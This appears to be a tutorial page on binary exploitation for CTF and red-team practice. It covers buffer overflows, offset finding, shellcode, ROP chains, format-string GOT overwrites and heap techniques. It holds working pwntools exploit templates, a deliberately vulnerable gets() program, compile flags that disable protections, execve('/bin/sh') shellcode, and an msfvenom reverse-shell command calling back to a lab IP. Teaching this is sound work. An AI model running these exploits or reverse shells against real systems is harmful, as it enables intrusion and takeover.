---
icon: binary-slash
---

# Exploit Development Fundamentals

## **Exploit Development Fundamentals ‚Äî Mastering the Art of Binary Exploitation**

***

Exploit development transforms a vulnerability into total control.\
In CTFs and red-team operations, this skill separates _script-kiddie_ from _operator_.\
This section will walk you through the **foundations of exploit crafting**, from buffer overflows and memory corruption to shellcode injection and return-oriented programming (ROP).

***

### I. üß© Core Concepts

| Concept             | Description                                                      |
| ------------------- | ---------------------------------------------------------------- |
| **Vulnerability**   | A software flaw that lets you influence execution.               |
| **Exploit**         | Code or payload that triggers the vulnerability to gain control. |
| **Buffer Overflow** | Overwriting adjacent memory on the stack.                        |
| **EIP/RIP Control** | Overwriting instruction pointer to hijack execution flow.        |
| **Shellcode**       | Machine-code payload executed after control is gained.           |
| **ROP Chain**       | Linking small code gadgets to bypass protections (NX/DEP).       |

***

### II. ‚öôÔ∏è The Exploit Development Mindset

1Ô∏è‚É£ **Identify the flaw** ‚Üí crash, fuzz, or analyze.\
2Ô∏è‚É£ **Reproduce** ‚Üí control the crash reliably.\
3Ô∏è‚É£ **Find control** ‚Üí overwrite registers (EIP/RIP).\
4Ô∏è‚É£ **Redirect execution** ‚Üí jump to shellcode or gadgets.\
5Ô∏è‚É£ **Bypass protections** ‚Üí ASLR, NX, PIE, Stack Canary.\
6Ô∏è‚É£ **Deliver payload** ‚Üí reverse shell, privilege escalation, persistence.

***

### III. üß† Setting Up Your Exploit Lab

#### üß© Tools

```bash
sudo apt install gdb gdb-multiarch pwntools peda nasm libc6-dbg
pip install pwntools ropper ROPgadget
```

#### üß† Recommended Environment

| Tool                          | Purpose                     |
| ----------------------------- | --------------------------- |
| **GDB + PEDA / GEF / pwndbg** | Interactive debugging       |
| **Pwntools**                  | Exploit scripting framework |
| **ROPgadget / Ropper**        | Gadget discovery            |
| **Radare2 / Cutter**          | Binary analysis             |
| **Ghidra / IDA Free**         | Decompilation               |
| **Immunity Debugger**         | Windows binary analysis     |

***

### IV. üí£ Understanding Buffer Overflows

#### üß© Example: Vulnerable Code

```c
#include <stdio.h>
#include <string.h>
int main() {
    char buf[64];
    gets(buf);
    printf("You entered: %s\n", buf);
    return 0;
}
```

When you input more than 64 bytes, you overwrite the return address ‚Üí control execution flow.

***

#### üß† Finding the Offset

**1. Generate a unique pattern**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

**2. Crash and capture EIP**

In GDB:

```bash
gdb ./vuln
run <pattern>
info registers
```

**3. Find offset**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
```

***

### V. üß© Gaining Control

Once you know the offset:

```bash
python3 -c "print('A'*offset + 'B'*4)" | ./vuln
```

If EIP = 0x42424242 (`BBBB`), you control execution.

***

### VI. üß† Injecting Shellcode

#### üß© Generate shellcode

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f python -b "\x00"
```

#### üí£ Inject into payload

```python
payload = b"A"*offset + eip + nop_sled + shellcode
```

#### ‚öôÔ∏è Example Payload (Pwntools)

```python
from pwn import *
p = process('./vuln')
payload = b"A"*72 + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
```

***

### VII. üß© Bypassing Protections

| Protection       | Bypass Technique                                |
| ---------------- | ----------------------------------------------- |
| **NX / DEP**     | Use ROP to execute system calls                 |
| **ASLR**         | Leak addresses (format string / info leak)      |
| **Stack Canary** | Leak or brute-force canary                      |
| **PIE**          | Leak binary base and rebase addresses           |
| **RELRO**        | Partial ‚Üí overwrite GOT entries; Full ‚Üí use ROP |

***

#### üß† Disable Protections for Practice

```bash
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
```

***

### VIII. ‚öôÔ∏è Return-Oriented Programming (ROP)

#### üß© Basic Idea

Use existing instructions ending in `ret` to perform logic when the stack is non-executable.

#### üß† Finding Gadgets

```bash
ROPgadget --binary vuln | grep "pop rdi"
```

#### ‚öôÔ∏è Example: Call `system("/bin/sh")`

```python
from pwn import *
elf = context.binary = ELF('./vuln')
rop = ROP(elf)
rop.call('system', [next(elf.search(b"/bin/sh"))])
payload = b"A"*offset + rop.chain()
p = process(elf.path)
p.sendline(payload)
p.interactive()
```

***

### IX. üß¨ Format String Exploits

#### üß† Identify

```c
printf(user_input);
```

#### üí£ Leak Memory

```bash
./vuln <<< "%p %p %p %p"
```

#### ‚öôÔ∏è Overwrite GOT Entry

Use `%n` specifier to write arbitrary data to memory.\
Pwntools makes this easy:

```python
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['system']})
```

***

### X. üß© Heap Exploitation Basics

| Technique                   | Description                                       |
| --------------------------- | ------------------------------------------------- |
| **Use-After-Free (UAF)**    | Accessing memory after freeing it.                |
| **Heap Overflow**           | Overwriting heap metadata to control allocations. |
| **Double Free**             | Freeing memory twice to control freelist.         |
| **House of Force / Spirit** | Classic heap manipulation strategies.             |

Tools:

```bash
sudo apt install heaptrack libc6-dbg
```

Use GDB plugin `heap-viewer` for visualization.

***

### XI. ‚öôÔ∏è Fuzzing & Crash Discovery

#### üß† Basic Fuzz Script

```python
from pwn import *
for i in range(100,2000,100):
    p = process('./vuln')
    p.sendline(b"A"*i)
    p.wait()
    p.close()
```

#### üß© Fuzzing Frameworks

| Tool          | Description              |
| ------------- | ------------------------ |
| **AFL++**     | Coverage-guided fuzzer   |
| **libFuzzer** | LLVM integrated fuzzing  |
| **boofuzz**   | Network protocol fuzzing |

***

### XII. üß† Debugging Workflows

#### üß© GDB Essentials

```bash
gdb ./vuln
break main
run
info registers
x/32x $esp
pattern create 200
pattern offset EIP
```

#### üß† GDB Plugins

| Plugin     | Command               | Feature                              |
| ---------- | --------------------- | ------------------------------------ |
| **pwndbg** | `context`             | Memory + register visualization      |
| **GEF**    | `heap`, `ropper`      | Heap and gadget utilities            |
| **PEDA**   | `checksec`, `pattern` | Binary protections and pattern tools |

***

### XIII. ‚öôÔ∏è Shellcode Engineering

#### üß© Writing Custom Shellcode (x86 Linux)

```asm
section .text
global _start
_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 0xb
    xor ecx, ecx
    xor edx, edx
    int 0x80
```

Assemble:

```bash
nasm -f elf32 shell.asm -o shell.o
ld -o shell shell.o
objdump -d shell | grep '[0-9a-f]:' | cut -f2 | tr -d '\n' | sed 's/ //g'
```

***

### XIV. üß© Exploit Template (Pwntools)

```python
from pwn import *
context(arch='amd64', os='linux')
elf = ELF('./vuln')
rop = ROP(elf)
offset = 72
payload = flat({offset: rop.ret.address}) + p64(elf.symbols['win'])
p = process(elf.path)
p.sendline(payload)
p.interactive()
```

***

### XV. üß† Practice Targets

| Platform              | Challenge Type                    |
| --------------------- | --------------------------------- |
| **pwnable.kr**        | Beginner-to-intermediate binaries |
| **exploit.education** | Protostar, Fusion, Nebula         |
| **HackTheBox**        | Binary exploitation boxes         |
| **CTFtime.org**       | Track live exploit challenges     |
| **ROP Emporium**      | ROP-focused binaries              |

***

### XVI. ‚öîÔ∏è Real-World Workflow Example

```bash
# 1. Analyze binary
checksec --file=./vuln

# 2. Find offset
pattern_create.rb -l 200
pattern_offset.rb -q 0x61616164

# 3. Craft exploit
python3 exploit.py

# 4. Test local
./vuln < payload

# 5. Deploy remote
python3 exploit.py REMOTE
```

***

### XVII. üß© Pro Tips & Red Team Tricks

‚úÖ **Scripting Discipline**

* Always build modular exploit templates.
* Automate testing offsets, payloads, and bad chars.

‚úÖ **Memory Hygiene**

* Use `valgrind` or `asan` to spot hidden corruption early.

‚úÖ **ROP Gadget Optimization**

* Combine gadgets to reduce chain size (less noise).

‚úÖ **Local-to-Remote Translation**

* Always sync binary versions and libc.
* Use `p.recvuntil()` for timing adjustments.

‚úÖ **Reporting**

* Document EIP/RIP control, offsets, bypasses, and payload outcomes.

***

### XVIII. ‚öôÔ∏è Quick Reference Table

| Topic             | Command / Tool                      | Description                   |
| ----------------- | ----------------------------------- | ----------------------------- |
| Offset            | `pattern_create` / `pattern_offset` | Identify buffer offset        |
| Debug             | GDB + pwndbg                        | Inspect crash & registers     |
| Shellcode         | `msfvenom`                          | Generate payloads             |
| ROP               | `ROPgadget`, `pwntools`             | Build chains                  |
| Protection Check  | `checksec`                          | View binary security features |
| Fuzzing           | Pwntools / AFL++                    | Crash discovery               |
| Exploit Framework | Pwntools                            | Automate everything           |

***
